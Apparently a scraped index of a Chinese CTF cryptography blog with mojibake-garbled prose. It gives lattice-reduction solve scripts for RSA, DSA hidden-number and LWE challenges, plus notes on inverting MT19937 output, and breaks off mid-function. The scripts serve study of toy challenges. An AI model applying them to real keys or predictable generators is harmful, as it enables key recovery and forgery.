´xä¼šå¿«ä¸€ç‚¹xd exp.sage from sage.all import* from Crypto.Util.number import * c = a = b = e=65537 zsm=Matrix(ZZ,[[a,1],[b,0]]) xq,pr=zsm.LLL()[0] xq,pr=abs(xq),abs(pr) for r in range(2**14,2**15): for x in range(50): p=pr+r q=x+xq n=p*q d=inverse(e,(p-1)*(q-1)) m=pow(c,d,n) flag=long_to_bytes(m) if b'NSSCTF{' in flag: print(flag) break ","date":"2025-06-29","objectID":"/ge-1/:3:1","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P4 task.py from Crypto.Util.number import * from gmpy2 import * flag = b'******' flag = bytes_to_long(flag) p = getPrime(1024) r = getPrime(175) a = inverse(r, p) a = (a*flag) % p print(f'a = {a}') print(f'p = {p}') $$ a\\equiv r^{-1}flag \\mod p \\\\ flag=ar+kp \\\\ \\begin{pmatrix} r\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00262^{170}\\\\ p\u00260 \\end{pmatrix}= \\begin{pmatrix} flag\u00262^{170}r \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * a = p = e=65537 zsm=Matrix(ZZ,[[a,2**170],[p,0]]) flag,R=zsm.LLL()[0] flag,R=abs(flag),abs(R) print(long_to_bytes(flag)) ","date":"2025-06-29","objectID":"/ge-1/:3:2","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P5 task.py from Crypto.Util.number import * from gmpy2 import * flag = b'******' m = bytes_to_long(flag) assert m.bit_length() == 351 p = getPrime(1024) b = getPrime(1024) c = getPrime(400) a = (b*m + c) % p print(f'a = {a}') print(f'b = {b}') print(f'p = {p}') $$ c=a-bm+kp\\\\ \\begin{pmatrix} 1\u0026m\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00260\u00262^{351}\\\\ -b\u00261\u00260\\\\ p\u00260\u00260 \\end{pmatrix}= \\begin{pmatrix} c\u0026m\u00262^{351} \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * a = b = p = zsm=Matrix(ZZ,[[a,0,2**351],[-b,1,0],[p,0,0]]) c,m,x=zsm.LLL()[0] c,m,x=abs(c),abs(m),abs(x) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:3","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P6 task.py from Crypto.Util.number import * flag = b'******' flag = bytes_to_long(flag) d = getPrime(400) for i in range(4): p = getPrime(512) q = getPrime(512) n = p * q e = inverse(d, (p-1)*(q-1)) c = pow(flag, e, n) print(f'e{i} =', e) print(f'n{i} =', n) print(f'c{i} =', c) åŸå‹åº”è¯¥æ˜¯NUSTCTF 2022 æ–°ç”Ÿèµ›çš„ä¸€ä¸ªè®ºæ–‡é¢˜ï¼ŒIJCSI-9-2-1-311-314 å…·ä½“å®ç°æ–¹æ³•æ˜¯æŠŠæœ€å¤§çš„nå¼€æ ¹å·èµ‹å€¼ç»™Mï¼Œç„¶åè¿˜æœ‰$e_id=1+k_i\\phi N_i$ï¼Œç„¶åè¿™é‡Œå‡è®¾äº†phiå¯ä»¥å†™ä½œN-sï¼Œä½¿å¼å­å˜æˆäº† $$ e_id=1+k_i(N_i-s_i)\\\\ e_id-k_iN_i=1-k_is_i\\\\ æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå¼å­dM=dM\\\\ å¯ä»¥å†™æˆçŸ©é˜µç›¸ä¹˜\\\\ \\begin{pmatrix} d \u0026 k_1 \u0026 k_2 \u0026 \\dots \u0026 k_i \\end{pmatrix} \\begin{pmatrix} M \u0026 e_1 \u0026 e_2 \u0026 \\dots \u0026 e_i \\\\ 0 \u0026 -N_1 \u0026 0 \u0026 \\dots \u0026 0 \\\\ 0 \u0026 0 \u0026 -N_2 \u0026 \\dots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 0 \u0026 \\dots \u0026 -N_i \\end{pmatrix}= \\begin{pmatrix} dM \u0026 1 - k_1 s_1 \u0026 1 - k_2 s_2 \u0026 \\dots \u0026 1 - k_is_i \\end{pmatrix} $$exp.sage from Crypto.Util.number import * from sage.all import* M = isqrt(n0) L = Matrix(ZZ, [[M, e0, e1, e2, e3], [0,-n0, 0, 0, 0], [0, 0,-n1, 0, 0], [0, 0, 0,-n2, 0], [0, 0, 0, 0,-n3]]) d = abs(L.LLL()[0][0]) // M m = power_mod(c0, d, n0) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:4","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P7 task.py from Crypto.Util.number import * flag = b'******' flag = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) n = p * q c = pow(flag, 65537, n) print(f'n =', n) print(f'c =', c) for i in range(2): d = getPrime(350) e = inverse(d, (p-1)*(q-1)) print(f'e{i} =', e) è¿™ä¸ªå…¶å®å°±æ˜¯ç»´çº³æ‹“å±•æ”»å‡»ï¼Œä»ä¸€å…ƒå˜æˆäº†äºŒå…ƒï¼Œç›´æ¥ä¸Šè„šæœ¬äº† exp.sage from Crypto.Util.number import * n = c = e0 = e1 = a = 5/14 D = diagonal_matrix(ZZ, [n, int(n^(1/2)), int(n^(1+a)), 1]) M = Matrix(ZZ, [[1, -n, 0, n^2], [0, e0, -e0, -e0*n], [0, 0, e1, -e1*n], [0, 0, 0, e0*e1]])*D L = M.LLL() t = vector(ZZ, L[0]) x = t * M^(-1) x * M = t phi = int(x[1]/x[0]*e0) d = inverse_mod(65537, phi) m = power_mod(c, d, n) print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:3:5","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P8 task.py from Crypto.Util.number import * flag = b'******' m = bytes_to_long(flag) p = getPrime(512) s = [getPrime(32) for i in range(3)] a = [getPrime(512) for i in range(3)] c = (a[0]*s[0]**2*s[1]**2 + a[1]*s[0]*s[2]**2 + a[2]*s[1]*s[2]) % p flag = m*s[0]*s[1]*s[2] print(f'c = {c}') print(f'flag = {flag}') print(f'a = {a}') print(f'p = {p}') ç›®çš„æ˜¯æ±‚sï¼Œè¦å¯¹è¿™ä¸ªå¼å­å˜å½¢ï¼Œæƒ³åŠæ³•ä½¿æœªçŸ¥é‡åœ¨ä¸€ä¾§ $$ -s_1s_2=a_0a^{-1}_2s_0^{2}s_1^{2}+a_1a_2^{-1}s_0s_2^{2}-ca_2^{-1}+kp \\\\ \\begin{pmatrix} s_0^{2}s_1^{2}\u0026s_0s_2^{2}\u00261\u0026k \\end{pmatrix} \\begin{pmatrix} a_0a^{-1}_2\u00260\u00260\u00261\\\\ a_1a_2^{-1}\u00260\u00261\u00260\\\\ -ca_2^{-1}\u00261\u00260\u00260\\\\ p\u00260\u00260\u00260 \\end{pmatrix}= \\begin{pmatrix} -s_1s_2\u00261\u0026s_0s_2^{2}\u0026s_0^{2}s_1^{2} \\end{pmatrix} $$å‘ç°ç›´æ¥è¿™æ ·æ‰“å‡ºä¸æ¥ï¼Œé…å¹³ä¸€ä¸‹ exp.sage from Crypto.Util.number import * c = flag = a = [] p = ia = inverse_mod(a[2], p) L = Matrix(ZZ, [[a[0]*ia%p, 0, 0, 1], [a[1]*ia%p, 0, 1, 0], [-c*ia%p, 1, 0, 0 ], [p, 0, 0, 0]]) * diagonal_matrix(ZZ, [1, 2^32, 2^128, 2^64]) v = L.LLL()[0] s0s1 = isqrt(abs(v[0])) s1s2 = abs(v[3]) \u003e\u003e 64 s1 = gcd(s0s1, s1s2) s0 = s0s1 // s1 s2 = s1s2 // s1 flag = flag // s0 // s1 // s2 print(long_to_bytes(flag)) ","date":"2025-06-29","objectID":"/ge-1/:3:6","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"HNPé—®é¢˜ å½¢å¼æ¯”è¾ƒå›ºå®šï¼Œä¸€èˆ¬é•¿è¿™æ ·$k_i\\equiv A_ix+B_i \\mod p$ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šæœ‰å¤šç»„kABï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¾é è¿™ä¸ªå»å»ºæ ¼ã€‚ è¿™ç§å¼å­ç»å¸¸å‡ºç°åœ¨DSAç­¾åä¸­ $$ r \\equiv g^k \\mod q \\\\ s \\equiv k^{-1}(H(m)+xr) \\mod q \\\\ k_i \\equiv s_i^{-1}r_ix+s_i^{-1}H(m) \\mod q \\\\ A=s_i^{-1}r_i,B=s_i^{-1}H(m) \\\\ k_i=A_ix+B+l_iq $$è¿™å°±æ˜¯ä¸€ä¸ªéå¸¸æ ‡å‡†çš„HNPäº†ï¼Œå»ºä¸€ä¸ªæ ¼ $$ \\begin{pmatrix} l_1 \u0026 l_2 \u0026 \\dots \u0026 l_i \u0026x \u0026 1 \\end{pmatrix} \\begin{pmatrix} q \u0026 0 \u0026 \\dots \u0026 0 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 \\dots \u0026 0 \u0026 0 \u0026 0\\\\ 0 \u0026 0 \u0026 \\ddots \u0026 0 \u0026 0 \u0026 0\\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 q \u0026 \\vdots \u0026 \\vdots\\\\ A_1 \u0026 A_2 \u0026 \\dots \u0026 A_i \u0026 K/q \u0026 0\\\\ B_1 \u0026 B_2 \u0026 \\dots \u0026 B_i \u0026 0 \u0026 K \\end{pmatrix}= \\begin{pmatrix} k_1 \u0026 k_2 \u0026 \\dots \u0026 k_i \u0026 Kx/q \u0026 K \\end{pmatrix} $$å¯¹åº”è„šæœ¬ import json t = 40 # Load data f = open(\"data\", \"r\") (q, Hm_s, r_s, s_s) = json.load(f) # Calculate A \u0026 B A = [] B = [] for r, s, Hm in zip(r_s, s_s, Hm_s): A.append( ZZ( (inverse_mod(s, q)*r) % q ) ) B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) ) # Construct Lattice K = 2^122 # ki \u003c 2^122 X = q * identity_matrix(QQ, t) # t * t Z = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 column Z2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 column Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * t Y = block_matrix([[Y, Z, Z2]]) # Find short vector Y = Y.LLL() # check k0 = ZZ(Y[1, 0] % q) x = ZZ(Y[1, -2] / (K/q) % q) assert(k0 == (A[0]*x + B[0]) % q) print(x) /** * å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~ * Lazzaro @ https://lazzzaro.github.io */ å½“ç„¶ç°åœ¨LCGçš„é¢˜ç›®é‡Œé¢ä¹Ÿæœ‰HNPäº†ï¼Œæ¯”å¦‚LCGå·²çŸ¥stateé«˜ä½æ±‚seed/LCGæœªçŸ¥a,bæ±‚seedï¼Œè¿™ç§é¢˜ç›®åœ¨0xGameä¸­æ˜¯å‡ºç°è¿‡çš„ ","date":"2025-06-29","objectID":"/ge-1/:4:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"1.2023é—½ç›¾æ¯ task.py from random import randbytes from hashlib import sha256 from secret import FLAG prime_q = prime_p = 2 * prime_q + 1 generator = 2 def generate_keys(prime_p:int, prime_q: int, generator: int): private_key = int(randbytes(48).hex(), 16) public_key = pow(generator, private_key, prime_p) return private_key, public_key def signature(m: str, private_key: int): ephemeral_key = pow(int.from_bytes(m.encode(), \"big\"), -1, prime_q) value_r = pow(generator, ephemeral_key, prime_p) % prime_q hash_value = sha256(m.encode()).hexdigest() value_s = pow(ephemeral_key, -1, prime_q) * (int(hash_value, 16) + private_key * value_r) % prime_q return hash_value, value_r, value_s def verification(message_hash: str, value_r: int, value_s: int, public_key: int): message_hash = int(message_hash, 16) inverse_s = pow(value_s, -1, prime_q) u1 = message_hash * inverse_s % prime_q u2 = value_r * inverse_s % prime_q value_v = (pow(generator, u1, prime_p) * pow(public_key, u2, prime_p) % prime_p) % prime_q return value_v == value_r private_key, public_key = generate_keys(prime_p, prime_q, generator) print(f\"prime_p = {prime_p}\") print(f\"prime_q = {prime_q}\") print(f\"generator = {generator}\") print(f\"public_key = {public_key}\") hash_value, value_r, value_s = signature(FLAG, private_key) assert verification(hash_value, value_r, value_s, public_key) print(\"FLAG= *******************************\") print(f\"Here is your gift = {hash_value}\") print(f\"value_r = {value_r}\") print(f\"value_s = {value_s}\") å…ˆçœ‹çœ‹ä»£ç ï¼Œå¯ä»¥çœ‹è§ä»–æŠŠflagåŠ å¯†å®Œå¸¦è¿›å»å½“ephemeral_keyäº†ï¼ŒæŒ‰ç…§ä¸Šé¢çš„å¼å­æ¥è¯´å°±æ˜¯ $$ m=k^{-1},hash(m)=H\\\\ s\\equiv k^{-1}\\times (H+xr) \\mod q \\\\ m=sH^{-1}-mxrH^{-1}+kq \\\\ sH^{-1}=B,-rH^{-1}=A,mx=t\\\\ m=At+B+kq\\\\ \\begin{pmatrix} k \u0026 t \u0026 1 \\end{pmatrix} \\begin{pmatrix} q\u00260\u00260\\\\ A\u00261/2^{384}\u00260\\\\ B\u00260\u00262^{320} \\end{pmatrix}= \\begin{pmatrix} m\u0026t/2^{384}\u00262^{320} \\end{pmatrix} $$è¿™è¾¹é…å¹³æ˜¯å› ä¸ºåªæ‰“æ ¼å‡ºä¸æ¥ï¼Œå°±æ”¹æ”¹ï¼Œèƒ½è·‘å‡ºæ¥å°±è¡Œ() exp.sage import gmpy2 from Crypto.Util.number import * p = q = g = 2 pb = h = '' r = s = H = int(h,16) inv = gmpy2.invert(H,q) A = -r*inv B = s*inv M = [[q,0,0], [A,1/2^384,0], [B,0,2^320]] Ge = Matrix(M) for i in Ge.LLL(): if i[-1] == 2^320: m = i[0] print(long_to_bytes(int(m))) ","date":"2025-06-29","objectID":"/ge-1/:4:1","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"2.BabyHNP task.py from secret import flag from random import randint import libnum import os assert len(flag) == 44 def padding(f): return f + os.urandom(64 - 1 - len(f)) n = 5 m = libnum.s2n(padding(flag)) q = libnum.generate_prime(512) A = [randint(1, q) for i in range(n)] B = [A[i] * m % q for i in range(n)] b = [B[i] % 2**128 for i in range(n)] print('q = %s' % q) print('A = %s' % A) print('b = %s' % b) $$ B_i=b_i+k\\times 2^{128} \\\\ b_i+k_i\\times 2^{128}\\equiv A_im \\mod q \\\\ k_i=A_im\\times (2^{-128} \\mod q)-b_i\\times (2^{-128} \\mod q)+l_iq $$è¿™ä¸ªå°±å’Œä¸Šé¢çš„æ ¼ä¸€æ¨¡ä¸€æ ·äº†ï¼Œç›´æ¥æ„å»ºå°±è¡Œäº† exp.sage from gmpy2 import * from Crypto.Util.number import * p = B = [, , , , ] R = [, , , , ] n = len(R) M = Matrix(QQ,n+2,n+2) inv = invert(2 ** 128,p) for i in range(n): M[i,i] = p M[-2,i] = B[i] * inv M[-1,i] = -R[i] * inv t = 1 / 2^128 K = 2^384 M[-2,-2] = t M[-1,-1] = K L = M.LLL() x = L[1][-2] // t m = x % p print(int(m).bit_length()) print(long_to_bytes(int(m))) çœ‹äº†å¥½å¤šå¸ˆå‚…çš„åšå®¢ï¼Œæ„Ÿè§‰HNPéƒ½å¯ä»¥å»ºæˆè¿™ä¸ªæ ¼ï¼Œä¸»è¦éš¾çš„è¿˜æ˜¯åŒ–ç®€æ„é€ ï¼Œå¾—è‡ªå·±å¤šç»ƒç»ƒï¼Œæ‰¾åˆ°è¿™ç§å»ºæ ¼å»æ‰“çš„æ„Ÿè§‰æ‰è¡Œ ","date":"2025-06-29","objectID":"/ge-1/:4:2","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"HSP\u0026HSSP HSPåœ¨æˆ‘çš„è®¤çŸ¥é‡Œå°±æ˜¯èƒŒåŒ…çš„å‡çº§ç‰ˆï¼Ÿæˆ–è€…è¯´èƒŒåŒ…å°±æ˜¯ä¸€ç§HSPï¼Œè€ŒHSSPæ˜¯ä¸€ç§æ­£äº¤æ ¼ï¼Œè¿™ä¸ªçœŸçš„ä¸ä¼šï¼Œçœ‹Toverç¥çš„åšå®¢å§ï¼Œæˆ‘åªä¼šå¥—è„šæœ¬ ","date":"2025-06-29","objectID":"/ge-1/:5:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"LWE è¿™ç§é—®é¢˜çš„ç‰¹ç‚¹åœ¨äºæœ‰ä¸€ä¸ªå™ªéŸ³e(ä¸€èˆ¬æ¯”è¾ƒå°)ï¼Œæ¯”å¦‚åŸå¼å­æ˜¯$Ax=b$ï¼ŒåŠ å…¥å™ªéŸ³ä¹‹åå˜æˆäº†$Ax+e=b$ï¼Œåœ¨æœªçŸ¥xå’Œeçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å»ºæ ¼å»å…ˆæ±‚å‡ºeï¼Œç„¶åè§£æ–¹ç¨‹æ±‚å‡ºxï¼Œæ„å»ºè¿™ä¸ªæ ¼å°±è¡Œäº† $$ \\begin{pmatrix} A \u00260\\\\ -b\u00261 \\end{pmatrix} $$","date":"2025-06-29","objectID":"/ge-1/:6:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"SUSCTF2022 task.py import numpy as np from secret import flag def gravity(n,d=0.25): A=np.zeros([n,n]) for i in range(n): for j in range(n): A[i,j]=d/n*(d**2+((i-j)/n)**2)**(-1.5) return A n=len(flag) A=gravity(n) x=np.array(list(flag)) b=A@x np.savetxt('b.txt',b) bå·²ç»ç»™å‡ºï¼Œé‚£ä¹ˆå¯ä»¥çŸ¥é“çŸ©é˜µçš„ç»´åº¦ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¢å¤å‡ºAï¼Œå†æŒ‰ç…§ä¸Šé¢çš„æ ¼å»æ‰“å‡ºeå°±è¡Œäº† exp.sage import numpy as np def gravity(n,d=0.25): A=np.zeros([n,n]) for i in range(n): for j in range(n): A[i,j]=d/n*(d**2+((i-j)/n)**2)**(-1.5) return A b = [] for i in open('b.txt','r').readlines(): b.append(float(i.strip())) n = 85 A = gravity(85) t = 10^21 for i in range(len(b)): b[i] = -b[i] * t for i in range(n): for j in range(n): A[i,j] = A[i,j] * t M = Matrix(ZZ,n+1,n+1) for i in range(n): M[-1,i] = b[i] for j in range(n): M[i,j] = A[i,j] M[-1,-1] = 1 e = M.LLL()[0] flag = M.solve_left(e) print(bytes(flag[:-1])) ","date":"2025-06-29","objectID":"/ge-1/:6:1","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"å¸¸ç”¨è„šæœ¬ è¿™é‡Œç›´æ¥æ¬laä½¬çš„äº† #è„šæœ¬1-å°è§„æ¨¡ #Sage from sage.modules.free_module_integer import IntegerLattice row = column = prime = ma = res = W = matrix(ZZ, ma) cc = vector(ZZ, res) # Babai's Nearest Plane algorithm def Babai_closest_vector(M, G, target): small = target for _ in range(5): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - small A1 = matrix.identity(column) Ap = matrix.identity(row) * prime B = block_matrix([[Ap], [W]]) lattice = IntegerLattice(B, lll_reduce=True) print(\"LLL done\") gram = lattice.reduced_basis.gram_schmidt()[0] target = vector(ZZ, res) re = Babai_closest_vector(lattice.reduced_basis, gram, target) print(\"Closest Vector: {}\".format(re)) R = IntegerModRing(prime) M = Matrix(R, ma) M = M.transpose() ingredients = M.solve_right(re) print(\"Ingredients: {}\".format(ingredients)) m = '' for i in range(len(ingredients)): m += chr(ingredients[i]) print(m) #è„šæœ¬2-å¤§è§„æ¨¡ #Sage from sage.modules.free_module_integer import IntegerLattice from random import randint import sys from itertools import starmap from operator import mul # Babai's Nearest Plane algorithm # from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/ def Babai_closest_vector(M, G, target): small = target for _ in range(1): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - small m = n = q = A_values = b_values = A = matrix(ZZ, m + n, m) for i in range(m): A[i, i] = q for x in range(m): for y in range(n): A[m + y, x] = A_values[x][y] lattice = IntegerLattice(A, lll_reduce=True) print(\"LLL done\") gram = lattice.reduced_basis.gram_schmidt()[0] target = vector(ZZ, b_values) res = Babai_closest_vector(lattice.reduced_basis, gram, target) print(\"Closest Vector: {}\".format(res)) R = IntegerModRing(q) M = Matrix(R, A_values) ingredients = M.solve_right(res) print(\"Ingredients: {}\".format(ingredients)) for row, b in zip(A_values, b_values): effect = sum(starmap(mul, zip(map(int, ingredients), row))) % q assert(abs(b - effect) \u003c 2 ** 37) print(\"ok\") ","date":"2025-06-29","objectID":"/ge-1/:6:2","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"ç®—æ³•æè¿° ","date":"2025-06-28","objectID":"/mt19937/:1:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"ä¸»è¦æ­¥éª¤ åˆ©ç”¨ seed åˆå§‹åŒ–å¯„å­˜å™¨çŠ¶æ€ å¯¹å¯„å­˜å™¨çŠ¶æ€è¿›è¡Œæ—‹è½¬ æ ¹æ®å¯„å­˜å™¨çŠ¶æ€æå–ä¼ªéšæœºæ•° åˆå§‹åŒ–å¯èƒ½ç”¨çš„æ˜¯å›ºå®šçš„ç§å­ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æœåŠ¡å™¨æ—¶é—´æˆ³ï¼Œç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º624çš„çŠ¶æ€æ•°ç»„ï¼Œå¡«å……å®Œåä½œä¸ºåˆå§‹çŠ¶æ€ æ—‹è½¬çš„ç›®çš„æ˜¯å¢åŠ ä¸ç¡®å®šæ€§è¿˜æœ‰å‡åŒ€æ€§ï¼Œä¸»è¦æ˜¯ä½è¿ç®—å®ç°çš„çº¿æ€§å˜æ¢ æå–ä¼ªéšæœºæ•°è¿™ä¸€æ­¥ä¼šä»çŠ¶æ€æ•°ç»„ä¸­ä¾æ¬¡æå–ä¸€ä¸ªæ•´æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œä½è¿ç®—å’Œå¼‚æˆ–è¿ç®—ï¼Œç”Ÿæˆçš„æ•°å³ä¸ºè¾“å‡ºçš„ä¼ªéšæœºæ•°ã€‚å½“æ‰€æœ‰æ•°ç»„å…¨è¢«éå†è¿‡ä¹‹åï¼Œå°±ä¼šå¯¹çŠ¶æ€æ•°ç»„å†æ¬¡è¿›è¡Œä¸€æ¬¡æ—‹è½¬ï¼Œé‡æ–°ç”Ÿæˆæ–°çš„çŠ¶æ€æ•°ç»„ã€‚ ","date":"2025-06-28","objectID":"/mt19937/:1:1","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"pythonä»£ç å®ç° è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å®ç°ä»£ç  def _int32(x): return int(0xFFFFFFFF \u0026 x) class MT19937: # åˆå§‹åŒ– def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] \u003e\u003e 30) + i) # æå–ä¼ªéšæœºæ•° def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y \u003e\u003e 11 y = y ^ y \u003c\u003c 7 \u0026 2636928640 y = y ^ y \u003c\u003c 15 \u0026 4022730752 y = y ^ y \u003e\u003e 18 self.mti = (self.mti + 1) % 624 return _int32(y) # æ—‹è½¬çŠ¶æ€ def twist(self): for i in range(0, 624): y = _int32((self.mt[i] \u0026 0x80000000) + (self.mt[(i + 1) % 624] \u0026 0x7fffffff)) self.mt[i] = (y \u003e\u003e 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df ä¸ºä»€ä¹ˆè¯´æ˜¯ç®€å•çš„ç”Ÿæˆæ–¹æ³•å‘¢ï¼Ÿå¯èƒ½çŸ¥é“pythonçš„randomåº“ä¹Ÿæ˜¯MT19937ç”Ÿæˆä¼ªéšæœºæ•°ï¼Œä½†æ˜¯å®ƒå¯¹ seed çš„ä¼ å…¥ç»è¿‡äº†ä¸¤æ­¥å¤„ç† init_genrandå’Œ init_by_arrayï¼Œå› æ­¤å’Œä¸Šé¢çš„å®ç°æ˜¯æœ‰åŒºåˆ«çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤è€…äº§ç”Ÿçš„çŠ¶æ€çŸ©é˜µå’Œä¼ªéšæœºæ•°æ˜¯ä¸ä¸€æ ·çš„ã€‚ ","date":"2025-06-28","objectID":"/mt19937/:1:2","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"é€†å‘extract_number è¿™é‡Œè·Ÿéšxennyè€å¸ˆçš„æ€è·¯èµ°ï¼Œå°±æ‹¿y = y ^ y \u003c\u003c 7 \u0026 2636928640ä¸¾ä¾‹ é‚£ä¹ˆæ•´ä¸ªå¼å­å°±æ˜¯ $$ y=x \\oplus ((x\\ll7)\\\u00262636928640)\\\\ \\quad\\quad\\quad\\quad\\quad\\quad =x \\oplus ((x\\ll7)\\\u002610011101001011000101011010000000) $$æ³¨æ„åä¸ƒä½éƒ½æ˜¯0ï¼Œé‚£ä¹ˆæœ€åç»“æœçš„åä¸ƒä½å’Œæœ€åˆçŠ¶æ€çš„åä¸ƒä½å°±æ˜¯ç›¸åŒçš„ï¼Œåœ¨yå·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­¥æ­¥å›æ¨äº†ï¼Œæ¯”å¦‚å€’æ•°8~14ä½å°±æ˜¯ $$ (åä¸ƒä½ \\\u0026 0101101) \\oplus yçš„å€’æ•°8åˆ°14ä½ $$å…¶ä»–çš„ç±»ä¼¼ï¼Œç”¨ä»£ç å®ç°å¦‚ä¸‹ def invert(res, shift, right=True, mask=0xffffffff, bits=32): tmp = res if right: for i in range(bits // shift): tmp = res ^ tmp \u003e\u003e shift \u0026 mask return tmp else: for i in range(bits // shift): tmp = res ^ tmp \u003c\u003c shift \u0026 mask return tmp def inv_extract_number(y): y = invert(y,18,True) y = invert(y,15,False,4022730752) y = invert(y,7,False,2636928640) y = invert(y,11,True) return _int32(y) ","date":"2025-06-28","objectID":"/mt19937/:2:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"é€†å‘twist åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬æåˆ°å¦‚æœå¾—åˆ°äº†æŸä¸€è½® state çš„å…¨éƒ¨ä¿¡æ¯ä¾¿å¯ä»¥å‘åé¢„æµ‹éšæœºæ•°ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬éœ€è¦å‘å‰æ¢å¤éšæœºæ•°ï¼Œåˆ™éœ€è¦å¯¹ twist å‡½æ•°è¿›è¡Œé€†å‘ã€‚ def twist(self): for i in range(0, 624): y = _int32((self.mt[i] \u0026 0x80000000) + (self.mt[(i + 1) % 624] \u0026 0x7fffffff)) self.mt[i] = (y \u003e\u003e 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df å…ˆå…³æ³¨æ—‹è½¬çš„åå‡ æ­¥æ“ä½œï¼Œèƒ½æ³¨æ„åˆ°ç”±äº y\u003e\u003e1çš„æœ€é«˜ä½ä¸€å®šä¸º 0ï¼Œæ‰€ä»¥æœ€ç»ˆ self.mt[i]çš„æœ€é«˜ä½ä¸€å®šç”± self.mt[(i + 397) % 624]æˆ– self.mt[(i + 397) % 624] ^ 0x9908b0dfæ§åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­å‡ºæ˜¯å¦ç»å†äº†xor 0x9908b0df æ“ä½œã€‚ç„¶åç”±äºæ˜¯å¦å¼‚æˆ–æ“ä½œåŒæ—¶å—æœ€ä½ä½æ§åˆ¶ï¼Œé‚£ä¹ˆé€†å‘çš„æ—¶å€™å³å¯ï¼Œé€šè¿‡æ˜¯å¦å¼‚æˆ–æ¥æ¢å¤å› ä¸ºå°±å³ç§»è€Œä¸¢å¤±çš„æœ€ä½ä½ã€‚äºæ˜¯æˆ‘ä»¬å°±å¾—åˆ°äº† y ç„¶ååˆ†ææ—‹è½¬çš„ç¬¬ä¸€æ­¥ï¼Œy æ˜¯ç”± self.mt[i]çš„æœ€é«˜ä½å’Œ self.mt[(i + 1) % 624]çš„é™¤æœ€é«˜ä½éƒ¨åˆ†ç»„åˆå¾—åˆ°çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦è®¡ç®— self.mt[i]å’Œ self.mt[(i - 1) % 624]ä¸¤ä¸ªä½ç½®çš„ y å°±èƒ½å¾—åˆ° self.mt[i]çš„å€¼äº† def inv_twist(state): high 